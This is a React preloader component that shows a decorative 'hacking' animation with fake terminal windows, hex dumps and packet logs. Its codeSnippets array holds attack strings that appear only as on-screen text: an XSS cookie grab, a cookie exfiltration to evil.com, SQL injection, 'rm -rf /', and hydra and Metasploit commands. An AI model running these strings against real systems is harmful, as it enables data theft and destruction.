import React, { useState, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'

export const Preloader = ({ onComplete }) => {
  const [progress, setProgress] = useState(0)
  const [isVisible, setIsVisible] = useState(true)
  const [currentLine, setCurrentLine] = useState(0)
  const [terminalOutput, setTerminalOutput] = useState([])
  const [hexStream, setHexStream] = useState([])
  const [networkPackets, setNetworkPackets] = useState([])

  const hackLines = [
    '> INITIALIZING ZERO-DAY EXPLOIT...',
    '> BYPASSING CORPORATE FIREWALL...',
    '> DECRYPTING AES-256 ENCRYPTION...',
    '> INFILTRATING SECURE MAINFRAME...',
    '> INJECTING ROOTKIT PAYLOAD...',
    '> COMPROMISING ACTIVE DIRECTORY...',
    '> ESTABLISHING PERSISTENT BACKDOOR...',
    '> EXFILTRATING SENSITIVE DATA...',
    '> COMPILING CUSTOM MALWARE...',
    '> EXECUTING PRIVILEGE ESCALATION...',
    '> SYSTEM FULLY COMPROMISED.',
    '> ACCESS GRANTED. WELCOME, ANONYMOUS.'
  ]

  const codeSnippets = [
    '0x48 0x65 0x6c 0x6c 0x6f 0x20 0x57 0x6f 0x72 0x6c 0x64',
    'root@darknet:~# ./exploit --target=corporate --stealth',
    'const breach = async () => { await escalatePrivileges(); return "pwned" }',
    'UNION SELECT username, password FROM admin_users--',
    '<img src=x onerror=alert(document.cookie)>',
    'ssh -o StrictHostKeyChecking=no root@192.168.1.1',
    'curl -X POST -H "Authorization: Bearer stolen_token" https://api',
    'import os; os.system("rm -rf / && echo "pwned"")',
    'while(true) { exploit.vulnerability(); exfiltrate.data(); }',
    'document.location="http://evil.com?cookie="+document.cookie',
    'nmap -sS -sV -O --script vuln 192.168.1.0/24',
    'hydra -l admin -P rockyou.txt ssh://target.com',
    'msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter"'
  ]

  const ipAddresses = [
    '192.168.1.100',
    '10.0.0.55',
    '172.16.0.23',
    '45.33.32.156',
    '203.0.113.42'
  ]

  useEffect(() => {
    const duration = 300
    const interval = 10
    const increment = 100 / (duration / interval)

    const timer = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(timer)
          return 100
        }
        return prev + increment
      })
    }, interval)

    const lineTimer = setInterval(() => {
      setCurrentLine(prev => (prev + 1) % hackLines.length)
    }, 150)

    const outputTimer = setInterval(() => {
      setTerminalOutput(prev => {
        const newLine = codeSnippets[Math.floor(Math.random() * codeSnippets.length)]
        if (prev.length > 10) {
          return [...prev.slice(1), newLine]
        }
        return [...prev, newLine]
      })
    }, 200)

    const hexTimer = setInterval(() => {
      setHexStream(prev => {
        const newHex = Array(8).fill(0).map(() => 
          Math.floor(Math.random() * 256).toString(16).padStart(2, '0').toUpperCase()
        ).join(' ')
        if (prev.length > 5) {
          return [...prev.slice(1), newHex]
        }
        return [...prev, newHex]
      })
    }, 100)

    const packetTimer = setInterval(() => {
      setNetworkPackets(prev => {
        const newPacket = {
          src: ipAddresses[Math.floor(Math.random() * ipAddresses.length)],
          dst: ipAddresses[Math.floor(Math.random() * ipAddresses.length)],
          port: Math.floor(Math.random() * 65535),
          size: Math.floor(Math.random() * 1500) + 64
        }
        if (prev.length > 8) {
          return [...prev.slice(1), newPacket]
        }
        return [...prev, newPacket]
      })
    }, 250)

    return () => {
      clearInterval(timer)
      clearInterval(lineTimer)
      clearInterval(outputTimer)
      clearInterval(hexTimer)
      clearInterval(packetTimer)
    }
  }, [])

  useEffect(() => {
    if (progress >= 100) {
      setTimeout(() => {
        setIsVisible(false)
        setTimeout(() => {
          onComplete?.()
        }, 50)
      }, 50)
    }
  }, [progress, onComplete])

  return (
    <AnimatePresence>
      {isVisible && (
        <motion.div
          initial={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 0.1 }}
          className="fixed inset-0 z-[100] flex items-center justify-center bg-black overflow-hidden font-mono"
        >
          {/* Clean uniform matrix rain */}
          <div className="absolute inset-0">
            {[...Array(40)].map((_, colIndex) => (
              <div
                key={colIndex}
                className="absolute top-0 bottom-0 flex flex-col"
                style={{ left: `${colIndex * 2.5}%`, width: '2.5%' }}
              >
                {[...Array(30)].map((_, rowIndex) => (
                  <motion.div
                    key={`${colIndex}-${rowIndex}`}
                    className="text-sm font-mono text-green-500 flex items-center justify-center"
                    initial={{ y: -20, opacity: 0 }}
                    animate={{ y: 0, opacity: 1 }}
                    transition={{
                      duration: 0.5,
                      repeat: Infinity,
                      delay: colIndex * 0.1 + rowIndex * 0.05,
                      repeatDelay: 3 + Math.random() * 2
                    }}
                    style={{ textShadow: '0 0 8px #00ff00' }}
                  >
                    {Math.random() > 0.5 ? '1' : '0'}
                  </motion.div>
                ))}
              </div>
            ))}
          </div>

          {/* Multiple terminal windows */}
          <div className="relative z-10 w-full max-w-6xl mx-6 grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Main terminal */}
            <div className="bg-black border-2 border-green-500 rounded-lg overflow-hidden shadow-2xl shadow-green-500/50">
              <div className="bg-green-900/40 px-3 py-2 flex items-center justify-between border-b border-green-500">
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-red-500 animate-pulse" />
                  <div className="w-3 h-3 rounded-full bg-yellow-500" />
                  <div className="w-3 h-3 rounded-full bg-green-500" />
                </div>
                <span className="text-green-400 text-xs font-bold">root@darknet:~# exploit.sh</span>
              </div>
              <div className="p-4">
                <motion.div
                  animate={{ opacity: [0.5, 1, 0.5] }}
                  transition={{ duration: 0.8, repeat: Infinity }}
                  className="text-green-400 text-sm mb-3"
                  style={{ textShadow: '0 0 10px #00ff00' }}
                >
                  {hackLines[currentLine]}
                </motion.div>
                <div className="bg-green-900/20 border border-green-500/50 rounded p-3 h-40 overflow-hidden">
                  <div className="space-y-1">
                    {terminalOutput.map((line, index) => (
                      <motion.div
                        key={index}
                        initial={{ opacity: 0, x: -10 }}
                        animate={{ opacity: 1, x: 0 }}
                        className="text-green-400 text-xs"
                        style={{ textShadow: '0 0 5px rgba(0, 255, 0, 0.7)' }}
                      >
                        <span className="text-green-600 mr-2">[{String(index + 1).padStart(2, '0')}]</span>
                        {line}
                      </motion.div>
                    ))}
                    <motion.div
                      animate={{ opacity: [1, 0, 1] }}
                      transition={{ duration: 0.6, repeat: Infinity }}
                      className="text-green-400 text-xs"
                    >
                      <span className="text-green-600 mr-2">[--]</span>
                      ▌
                    </motion.div>
                  </div>
                </div>
              </div>
            </div>

            {/* Hex dump terminal */}
            <div className="bg-black border-2 border-red-500 rounded-lg overflow-hidden shadow-2xl shadow-red-500/50">
              <div className="bg-red-900/40 px-3 py-2 flex items-center justify-between border-b border-red-500">
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-red-500 animate-pulse" />
                  <div className="w-3 h-3 rounded-full bg-yellow-500" />
                  <div className="w-3 h-3 rounded-full bg-green-500" />
                </div>
                <span className="text-red-400 text-xs font-bold">root@darknet:~# hexdump</span>
              </div>
              <div className="p-4">
                <div className="text-red-400 text-xs mb-2" style={{ textShadow: '0 0 10px #ff0000' }}>
                  MEMORY DUMP - ENCRYPTED PAYLOAD
                </div>
                <div className="bg-red-900/20 border border-red-500/50 rounded p-3 h-40 overflow-hidden">
                  <div className="space-y-1">
                    {hexStream.map((hex, index) => (
                      <motion.div
                        key={index}
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        className="text-red-400 text-xs font-mono"
                        style={{ textShadow: '0 0 5px rgba(255, 0, 0, 0.7)' }}
                      >
                        <span className="text-red-600 mr-2">0x{(index * 8).toString(16).padStart(4, '0').toUpperCase()}:</span>
                        {hex}
                      </motion.div>
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* Network traffic terminal */}
            <div className="bg-black border-2 border-cyan-500 rounded-lg overflow-hidden shadow-2xl shadow-cyan-500/50">
              <div className="bg-cyan-900/40 px-3 py-2 flex items-center justify-between border-b border-cyan-500">
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-red-500 animate-pulse" />
                  <div className="w-3 h-3 rounded-full bg-yellow-500" />
                  <div className="w-3 h-3 rounded-full bg-green-500" />
                </div>
                <span className="text-cyan-400 text-xs font-bold">root@darknet:~# tcpdump</span>
              </div>
              <div className="p-4">
                <div className="text-cyan-400 text-xs mb-2" style={{ textShadow: '0 0 10px #00ffff' }}>
                  NETWORK TRAFFIC - LIVE CAPTURE
                </div>
                <div className="bg-cyan-900/20 border border-cyan-500/50 rounded p-3 h-40 overflow-hidden">
                  <div className="space-y-1">
                    {networkPackets.map((packet, index) => (
                      <motion.div
                        key={index}
                        initial={{ opacity: 0, x: 10 }}
                        animate={{ opacity: 1, x: 0 }}
                        className="text-cyan-400 text-xs"
                        style={{ textShadow: '0 0 5px rgba(0, 255, 255, 0.7)' }}
                      >
                        <span className="text-cyan-600 mr-2">[{String(index + 1).padStart(2, '0')}]</span>
                        {packet.src}:{packet.port} → {packet.dst} [{packet.size} bytes]
                      </motion.div>
                    ))}
                  </div>
                </div>
              </div>
            </div>

            {/* Progress terminal */}
            <div className="bg-black border-2 border-yellow-500 rounded-lg overflow-hidden shadow-2xl shadow-yellow-500/50">
              <div className="bg-yellow-900/40 px-3 py-2 flex items-center justify-between border-b border-yellow-500">
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-red-500 animate-pulse" />
                  <div className="w-3 h-3 rounded-full bg-yellow-500" />
                  <div className="w-3 h-3 rounded-full bg-green-500" />
                </div>
                <span className="text-yellow-400 text-xs font-bold">root@darknet:~# progress</span>
              </div>
              <div className="p-4">
                <div className="space-y-3">
                  <div className="flex items-center justify-between text-yellow-400 text-xs">
                    <span>BREACH PROGRESS:</span>
                    <span className="font-bold">{Math.round(progress)}%</span>
                  </div>
                  <div className="h-2 bg-yellow-900/30 border border-yellow-500 rounded overflow-hidden">
                    <motion.div
                      className="h-full bg-yellow-500"
                      initial={{ width: 0 }}
                      animate={{ width: `${progress}%` }}
                      transition={{ duration: 0.05 }}
                      style={{ boxShadow: '0 0 15px rgba(255, 255, 0, 0.7)' }}
                    />
                  </div>
                  <div className="grid grid-cols-2 gap-2 text-xs">
                    <div className="text-green-400">
                      <span className="animate-pulse">●</span> FIREWALL: BYPASSED
                    </div>
                    <div className="text-green-400">
                      <span className="animate-pulse">●</span> ENCRYPTION: CRACKED
                    </div>
                    <div className="text-yellow-400">
                      <span className="animate-pulse">●</span> DATA: EXFILTRATING
                    </div>
                    <div className="text-red-400">
                      <span className="animate-pulse">●</span> SYSTEM: COMPROMISED
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Glitch effects */}
          <motion.div
            className="absolute inset-0 pointer-events-none"
            animate={{ opacity: [0, 0.15, 0] }}
            transition={{ duration: 0.05, repeat: Infinity, repeatDelay: 1.5 }}
          >
            <div className="absolute inset-0 bg-green-500/20" />
          </motion.div>
          <motion.div
            className="absolute inset-0 pointer-events-none"
            animate={{ opacity: [0, 0.1, 0] }}
            transition={{ duration: 0.03, repeat: Infinity, repeatDelay: 2.3 }}
          >
            <div className="absolute inset-0 bg-red-500/10" />
          </motion.div>

          {/* Scanlines */}
          <div className="absolute inset-0 pointer-events-none opacity-10">
            <div className="absolute inset-0 bg-gradient-to-b from-transparent via-green-500/50 to-transparent h-1 animate-pulse" />
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  )
}